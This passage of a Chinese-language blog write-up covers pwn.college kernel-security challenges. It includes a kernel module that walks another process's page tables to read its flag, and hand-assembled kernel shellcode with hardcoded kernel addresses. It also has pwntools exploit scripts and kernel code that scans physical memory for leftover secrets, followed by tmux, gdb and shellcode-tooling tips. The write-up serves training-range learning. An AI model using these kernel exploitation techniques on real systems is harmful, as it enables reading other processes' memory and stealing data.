class="hljs-comment">//v2p.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/pid.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/pgtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/highmem.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br><br><span class="hljs-type">void</span> <span class="hljs-title function_">test_func</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br><span class="hljs-comment">//int init_module(void)&#123;</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> * <span class="hljs-title">kpid</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span>;</span><br>	<span class="hljs-comment">//char task_name[TASK_COMM_LEN] = &#123;0&#125;;</span><br><br>	<span class="hljs-type">pid_t</span> current_pid = current -&gt; pid;<br>	<span class="hljs-comment">//printk(KERN_INFO &quot;current_pid = %d\n&quot;,current_pid);</span><br><br>	kpid = find_get_pid(current_pid+<span class="hljs-number">1</span>);<br>	task = get_pid_task(kpid,PIDTYPE_PID);<br><br>    <span class="hljs-comment">//printk(KERN_INFO &quot;task_name = %s, task_pid = %d\n&quot;,get_task_comm(task_name,task),task-&gt;pid);</span><br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v_address = <span class="hljs-number">0x404040</span>;<br>	<span class="hljs-type">pgd_t</span>* pgde;<br>	<span class="hljs-type">p4d_t</span>* p4de;<br>	<span class="hljs-type">pud_t</span>* pude;<br>	<span class="hljs-type">pmd_t</span>* pmde;<br>	<span class="hljs-type">pte_t</span>* pte;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> task-&gt;mm;<br>	pgde = pgd_offset(mm,v_address); <br><br>	p4de = p4d_offset(pgde,v_address);<br><br>	pude = pud_offset(p4de,v_address); <br><br>	pmde = pmd_offset(pude,v_address);<br><br>	pte = pte_offset_kernel(pmde,v_address);	<br><br>	<span class="hljs-comment">//unsigned pte_addr = pte_val(*pte);</span><br>	<span class="hljs-comment">//printk(KERN_INFO &quot;pte_val = 0x%lx\n&quot;,pte_addr);</span><br>	<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_addr = pte_val(*pte) &amp; PAGE_MASK;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_offset = v_address &amp; ~PAGE_MASK;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> phy_addr = page_addr | page_offset;<br>	<span class="hljs-comment">//printk(KERN_INFO &quot;page_addr = 0x%lx, page_offset = 0x%lx\n&quot;,page_addr,page_offset);</span><br>	<span class="hljs-comment">//printk(KERN_INFO &quot;v_address = 0x%lx, phy_addr = 0x%lx\n&quot;,v_address,phy_addr);</span><br>	<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> PT_addr = pte_page(*pte);<br>	<span class="hljs-comment">//printk(KERN_INFO &quot;PT_addr = %lx\n&quot;,PT_addr);</span><br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vptr=kmap(PT_addr);<br>	<span class="hljs-comment">//printk(KERN_INFO &quot;vptr = 0x%lx, mapped_vaddress = 0x%lx\n&quot;,vptr,vptr+page_offset);</span><br><br>	<span class="hljs-type">char</span> *flag = (<span class="hljs-type">char</span> *)(vptr+page_offset);<br>	printk(KERN_INFO <span class="hljs-string">&quot;flag : %s\n&quot;</span>,flag);<br><br>	kunmap(page_addr);<br><br>	<span class="hljs-comment">//unsigned long father_phy_addr = virt_to_phys(v_address);</span><br>	<span class="hljs-comment">//printk(KERN_INFO &quot;father_phy_addr = 0x%lx&quot;,father_phy_addr);</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>汇编中一些关键地址需要手动获取和修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ffffffff81084aa0 T find_get_pid<br>ffffffff810848b0 T get_pid_task<br>ffffffff810b6309 T printk<br>ffffffff81aaa570 T _cond_resched<br><br>gs:current_task = gs:<span class="hljs-number">0x15d00</span><br>page_offset_base = <span class="hljs-number">0xffff888000000000</span><br>vmemmap_base = <span class="hljs-number">0xffffea0000000000</span><br></code></pre></td></tr></table></figure>

<p>写内核shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs asm">//v2p.s<br>.intel_syntax noprefix<br><br>.section .text<br>.global _start<br>_start:<br>    mov     rax,QWORD PTR gs:0x15d00<br><br>    push    rbx<br>    mov    edi,DWORD PTR [rax+0x490]<br>    add    edi,0x1<br>    mov     rcx,0xffffffff81084aa0<br>    call    rcx<br><br>    xor    esi,esi<br>    mov    rdi,rax<br>    mov     rcx,0xffffffff810848b0<br>    call    rcx<br>    <br>    mov    rcx, 0xffff888000000000          <br>    movabs  rsi,0xffffffffff000<br><br>    mov    rax,QWORD PTR [rax+0x3e0]<br>    mov    rax,QWORD PTR [rax+0x50]<br>    mov    rdi,QWORD PTR [rax]<br>    movabs rax,0xfffffc0000000<br><br>    and    rdi,rsi<br>    mov    rdx,QWORD PTR [rdi+rcx*1]<br>    test   dl,0x80<br>    cmove  rax,rsi<br>    and    rdx,rax<br>    mov    rax,QWORD PTR [rcx+rdx*1+0x10]<br>    movabs rdx,0xfffffffe00000<br><br>    test   al,0x80<br>    cmove  rdx,rsi<br>    and    rax,rdx<br>    mov    rax,QWORD PTR [rcx+rax*1+0x20]<br>    test   rax,rax<br>    <br>    mov    rdx,rax<br>    not    rdx<br>    and    edx,0x1<br>    neg    rdx<br>    xor    rax,rdx<br><br>    shl    rax,0xc<br>    mov    rbx,rax<br>    shr    rbx,0x18<br>    shl    rbx,0x6<br>    mov    rax,0xffffea0000000000<br>    add    rbx,rax  <br>    mov    rax,0xffffffff81aaa570<br>    call   rax       <br><br>    mov    rax,0xffffea0000000000<br>    sub    rbx,rax   <br>    mov    rax,0xffff888000000000      <br>    sar    rbx,0x6<br>    shl    rbx,0xc<br>    lea    rsi,[rbx+rax*1+0x40]<br>    mov rax,0x0a7325<br>    push rax<br>    mov rdi,rsp<br>    mov rax,0xffffffff810b6309<br>    call rax<br>    pop rax<br><br>    ret<br>//gcc -c -o v2p v2p.s -masm=intel -nostdlib -Ttext=0<br>//bin2shellcode shellcode<br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;/challenge/babykernel_level11.1&#x27;</span>)<br><br>ksc = <span class="hljs-string">b&#x27;\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x53\x8b\xb8\x90\x04\x00\x00\x83\xc7\x01\x48\xc7\xc1\xa0\x4a\x08\x81\xff\xd1\x31\xf6\x48\x89\xc7\x48\xc7\xc1\xb0\x48\x08\x81\xff\xd1\x48\xb9\x00\x00\x00\x00\x80\x88\xff\xff\x48\xbe\x00\xf0\xff\xff\xff\xff\x0f\x00\x48\x8b\x80\xe0\x03\x00\x00\x48\x8b\x40\x50\x48\x8b\x38\x48\xb8\x00\x00\x00\xc0\xff\xff\x0f\x00\x48\x21\xf7\x48\x8b\x14\x0f\xf6\xc2\x80\x48\x0f\x44\xc6\x48\x21\xc2\x48\x8b\x44\x11\x10\x48\xba\x00\x00\xe0\xff\xff\xff\x0f\x00\xa8\x80\x48\x0f\x44\xd6\x48\x21\xd0\x48\x8b\x44\x01\x20\x48\x85\xc0\x48\x89\xc2\x48\xf7\xd2\x83\xe2\x01\x48\xf7\xda\x48\x31\xd0\x48\xc1\xe0\x0c\x48\x89\xc3\x48\xc1\xeb\x18\x48\xc1\xe3\x06\x48\xb8\x00\x00\x00\x00\x00\xea\xff\xff\x48\x01\xc3\x48\xc7\xc0\x70\xa5\xaa\x81\xff\xd0\x48\xb8\x00\x00\x00\x00\x00\xea\xff\xff\x48\x29\xc3\x48\xb8\x00\x00\x00\x00\x80\x88\xff\xff\x48\xc1\xfb\x06\x48\xc1\xe3\x0c\x48\x8d\x74\x03\x40\x48\xc7\xc0\x25\x73\x0a\x00\x50\x48\x89\xe7\x48\xc7\xc0\x09\x63\x0b\x81\xff\xd0\x58\xc3&#x27;</span><br>shellcode = shellcraft.amd64.write(<span class="hljs-number">3</span>,ksc,<span class="hljs-built_in">len</span>(ksc)) <br>usc = asm(shellcode)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Attempting to load the flag into memory.&#x27;</span>)<br>io.sendline(usc)<br><br>io.interactive()<br><span class="hljs-comment">#dmesg</span><br></code></pre></td></tr></table></figure>

<p>ps:尝试了使用gdb调试fork出的子进程打印内存、设置suid程序等其他方式，但是使用gdb启动suid程序并没有root权限，无法读取&#x2F;flag。</p>
<h3 id="level12-0-amp-level12-1"><a href="#level12-0-amp-level12-1" class="headerlink" title="level12.0 &amp; level12.1"></a>level12.0 &amp; level12.1</h3><p>和level11唯一的不同点在于level12的子进程读取完flag后exit()结束了进程。</p>
<p>子进程被杀死后只是销毁了用于映射的内核页表，其原本物理内存中的数据在被其它进程重用前不会被清空（否则会产生较大的开销，影响内核运行效率），因此我们可以在物理内存中搜索flag字符串。</p>
<p>但是内核态不能直接读写物理内存，需要先将物理内存映射到内核空间。</p>
<p>笔者在level11中使用kmap，该方式需要先获取页表结构体，但是页表映射已经被销毁，并且无法寻址flag在哪个页表以及确定flag的物理地址。</p>
<p>笔者还尝试了ioremap，但是该方式只能映射io物理地址空间，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/sijinxiaotongxue/article/details/81123254">该文章</a>，而我们需要映射ram物理地址空间。</p>
<p>查找资料了解到内核空间中ffff880000000000 - ffffc7ffffffffff地址的64tb空间从0开始线性映射了整个ram物理内存，我们可以直接访问这片空间来读写ram物理内存。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://wjrsbu.smartapps.cn/pages/article/index?id=578569516">［知乎］linux内核虚拟空间布局和内核物理内存映射</a></p>
<p>现在可以访问物理内存了，两种解题方法:</p>
<ul>
<li><p>方法1：遍历物理地址的内核映射空间(经测试一般flag出现在ffff888070000000 - ffff88807ffe0000)，搜索pwn.college字符串。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=gITPImnJvNM">https://www.youtube.com/watch?v=gITPImnJvNM</a></p>
</li>
<li><p>方法2：通过<code>phys_to_virt</code>函数获取物理地址对应的内核映射地址，从0开始线性遍历所有物理地址，搜索pwn.college字符串。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=WhQlyJoeD7M">https://www.youtube.com/watch?v=WhQlyJoeD7M</a></p>
</li>
</ul>
<p>需要注意的是：在子进程结束之后不能进行太多的内存操作，否则存放flag的物理页在被重用后会被清空，比如python是解释型语言，需要在运行时进行较多的内存操作，如果使用python脚本进行交互，很可能导致flag被覆盖。</p>
<p>方法1:</p>
<p>flag的出现有一定随机性，需要重复几次</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>ksc = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rdi,0xffff888070000000</span><br><span class="hljs-string">    mov rax,0xffffffff810b6309</span><br><span class="hljs-string">    lea rbx,[rip + label]</span><br><span class="hljs-string">    mov rbx,[rbx]</span><br><span class="hljs-string">    top_of_loop:</span><br><span class="hljs-string">    cmp rbx,[rdi]</span><br><span class="hljs-string">    je done</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    jmp top_of_loop</span><br><span class="hljs-string">    done:</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    call rax</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    jmp top_of_loop</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">    label:</span><br><span class="hljs-string">    .string &quot;pwn.college&quot;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>usc = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax,1</span><br><span class="hljs-string">    mov rdi,3</span><br><span class="hljs-string">    lea rsi,[rip + kernel_sc]</span><br><span class="hljs-string">    mov rdx,0xffff</span><br><span class="hljs-string">    syscall </span><br><span class="hljs-string">    ret </span><br><span class="hljs-string">    kernel_sc:</span><br><span class="hljs-string">        nop</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br>usc += ksc<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;12.sc&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(usc)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">cat 12.sc | /challenge/babykernel_level12.1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>方法2：</p>
<p>使用free命令查看总物理内存大小为2029544，注意默认以KB为单位显示，2029544 * 1024 &#x3D; 0x7BDFA000</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@vm_kernel-security~level12-1:~$ free<br>              total        used        free      shared  buff/cache   available<br>Mem:        2029544       16564     1999720           0       13260     1988740<br>Swap:             0           0           0<br></code></pre></td></tr></table></figure>

<p>在删除模块时遍历搜索物理内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123; <br>    printk(KERN_INFO <span class="hljs-string">&quot;Hello pwn.college!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">cleanup_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123; <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> i;<br>    printk(KERN_INFO <span class="hljs-string">&quot;LOOKING FOR FLAG!\n&quot;</span>);<br><br>    __asm__(<span class="hljs-string">&quot;nop;nop;nop;nop;&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0x40</span>;i&lt;<span class="hljs-number">0x7BDFA000</span>;i+=<span class="hljs-number">0x1000</span>)<br>    &#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *mapped_addr = phys_to_virt(i);<br>        <span class="hljs-keyword">if</span>(*mapped_addr == <span class="hljs-number">0x6c6c6f632e6e7770</span>)<span class="hljs-comment">//pwn.coll </span><br>        &#123;<br>            printk(KERN_INFO <span class="hljs-string">&quot;FLAG WAS AT %lx: %s&quot;</span>,mapped_addr,(<span class="hljs-type">char</span> *)mapped_addr);<br>        &#125;<br>    &#125;<br>    __asm__(<span class="hljs-string">&quot;nop;nop;nop;nop;&quot;</span>);<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;Goodbye pwn.college!\n&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>sleep_rmmod程序，睡眠一段时间后删除模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    sleep(<span class="hljs-number">5</span>);<br>    delete_module(<span class="hljs-string">&quot;debug&quot;</span>,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>为了防止flag所在内存被重用清空，按如下顺序运行程序</p>
<ul>
<li><code>insmod phy_search.ko</code></li>
<li><code>sleep_rmmod</code></li>
<li><code>/challenge/babykernel_level12.1</code></li>
</ul>
<p>验证该方式能获取flag后将<code>phy_search</code>源码中nop之间的部分翻译为内核态shellcode以方法1中的方式输入运行challenge程序即可。</p>
<h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p><a target="_blank" rel="noopener" href="https://x3h1n.github.io/2019/06/28/Linux-kernel-pwn%E5%9F%BA%E7%A1%80/">一些技巧汇总</a></p>
<h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p>发现教学视频里可以在同一个窗口切换不同的shell，特别方便，经观察使用的应该是tmux终端复用器，apt install安装即可。</p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/ryerh/14b7c24dfd623ef8edc7">Tmux 快捷键 &amp; 速查表 &amp; 简明教程</a></p>
<p><code>ctrl + b</code>在tmux中称为前缀(prefix)，用于快捷键。</p>
<p>一些常用会话和窗口操作如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">prefix + :new&lt;回车&gt;  #启动新会话<br>prefix + s           #打开会话管理界面，可以查看所有会话状态以及上下切换会话<br>prefix + $           #重命名当前会话<br>prefix + d / tmux detach          #分离会话，会话仍然在后台运行<br>tmux ls              #列出所有会话<br>tmux attach-session -t &lt;session_name&gt;    #进入会话<br>tmux kill-session -t &lt;session_name&gt;      #杀死某个会话<br>tmux kill-server     #杀死所有会话<br>tmux switch-client -t &lt;session_name&gt;     #会话内切换会话<br><br>prefix + c  #创建新窗口<br>prefix + w  #列出所有窗口<br>prefix + n  #后一个窗口<br>prefix + p  #前一个窗口<br>prefix + f  #查找窗口<br>prefix + ,  #重命名当前窗口<br>prefix + &amp; / ctrl + d / exit    #关闭当前窗口<br>prefix + 窗口编号  #快速切换窗口<br><br>Esc     #回退<br></code></pre></td></tr></table></figure>

<p>另外，每次重启系统session都会丢失，可以安装保存和恢复会话的tmux插件，<a target="_blank" rel="noopener" href="https://www.scutmath.com/tmux_session_save_restore.html">参考教程</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">prefix + ctrl-s    #保存session<br>prefix + ctrl-r    #恢复session<br></code></pre></td></tr></table></figure>

<h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><p>在qemu虚拟机外使用gdb附加调试的具体调试步骤在<code>Environment setup</code>一节中。</p>
<p>在靶场中可以使用<code>vm</code>命令，以下是一些常用操作</p>
<ul>
<li><code>vm connect</code>，连接到qemu启动的客户机，在vm内机器名前会有<code>vm_</code>前缀</li>
<li><code>vm debug</code>，在vm外使用，启动gdb附加到qemu从外部调试vm</li>
<li><code>vm build</code>，将内核模块c源码构建为内核模块，可用于获取偏移等操作</li>
</ul>
<p>可以<code>objdump</code>反汇编查看程序的入口点，在入口点下断点后再在仿真环境中运行要调试的用户态程序，也可以获取内核符号地址后断在某个内核函数处。</p>
<h4 id="objdump反汇编"><a href="#objdump反汇编" class="headerlink" title="objdump反汇编"></a>objdump反汇编</h4><p>靶场的环境中有ida，但是并不好用，使用objdump命令可以反汇编文件，例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -M intel -d <span class="hljs-built_in">exit</span></span><br>exit:     file format elf64-x86-64<br>Disassembly of section .text:<br>0000000000401000 &lt;_start&gt;:<br>  401000:       31 c0                   xor    eax,eax<br>  401002:       b0 3c                   mov    al,0x3c<br>  401004:       0f 05                   syscall<br></code></pre></td></tr></table></figure>

<h4 id="一些有用的gdb调试语句"><a href="#一些有用的gdb调试语句" class="headerlink" title="一些有用的gdb调试语句"></a>一些有用的gdb调试语句</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">x/5i $rip   #查看rip为地址开始的5条汇编指令<br>disp/5i $rip  #打印rip为地址开始的5条汇编指令,每执行一次gdb指令都会打印一次<br>p/x $rcx  #以16进制形式打印寄存器中的值<br>disp/x $rax #打印rax寄存器的值,每执行一次gdb指令都会打印一次<br>info b   #查看断电信息<br>del num    #删除编号为num的断点<br>info register all  #查看所有寄存器的值<br></code></pre></td></tr></table></figure>

<h4 id="获取内核符号地址"><a href="#获取内核符号地址" class="headerlink" title="获取内核符号地址"></a>获取内核符号地址</h4><p>拥有符号地址可以方便我们将断点设在函数上，获取内核符号地址有两种方式：</p>
<ul>
<li>如果拥有内核映像，可以使用<code>objdump</code>或<code>nm</code>命令，比如：使用<code>objdump -d linux-5.4/vmlinux -M intel | grep do_syscall_64</code>获取<code>do_syscall_64</code>函数的地址</li>
<li><code>cat /proc/kallsyms</code>，打印所有内核中的符号和地址。只在root权限下有效，否则地址显示为0。</li>
</ul>
<h3 id="自制linux实用工具"><a href="#自制linux实用工具" class="headerlink" title="自制linux实用工具"></a>自制linux实用工具</h3><h4 id="lookup-syscall"><a href="#lookup-syscall" class="headerlink" title="lookup_syscall"></a>lookup_syscall</h4><p>输入系统调用名输出系统调用号或输入系统调用号输出系统调用名</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240302193623.png" srcset="/img/loading.gif" lazyload alt="12"></p>
<h4 id="bin2shellcode"><a href="#bin2shellcode" class="headerlink" title="bin2shellcode"></a>bin2shellcode</h4><p>便于shellcode编写，将二进制文件转换成16进制shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>for i in $(objdump -d $1 |grep &quot;^ &quot; |cut -f2); do echo -n &#x27;\x&#x27;$i; done;echo<br></code></pre></td></tr></table></figure>



<h4 id="assemble"><a href="#assemble" class="headerlink" title="assemble"></a>assemble</h4><p>集成化shellcode编写工具</p>
<ul>
<li><p>生成代码对应的汇编代码文件(.s)、ELF文件、二进制纯机器码文件(.raw)。</p>
</li>
<li><p>使用<code>objdump</code>工具输出反汇编结果，<code>hd</code>工具输出.raw文件的16进制。</p>
</li>
<li><p>生成适配c、python2、python3和shell语言的shellcode代码</p>
</li>
<li><p>输出strace命令跟踪系统调用的结果</p>
</li>
</ul>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240302194227.png" srcset="/img/loading.gif" lazyload alt="13"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="../../../../categories/PwnCollege%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">PwnCollege刷题记录</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="../../../../tags/Pwn/">#Pwn</a>
      
        <a href="../../../../tags/PwnCollege/">#PwnCollege</a>
      
        <a href="../../../../tags/Linux-kernel/">#Linux kernel</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>PwnCollege - SystemSecurity - KernelSecurity</div>
      <div>https://lkliki.github.io/2024/03/27/PwnCollege-SystemSecurity-Kernel/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>0P1N</div>
        </div>
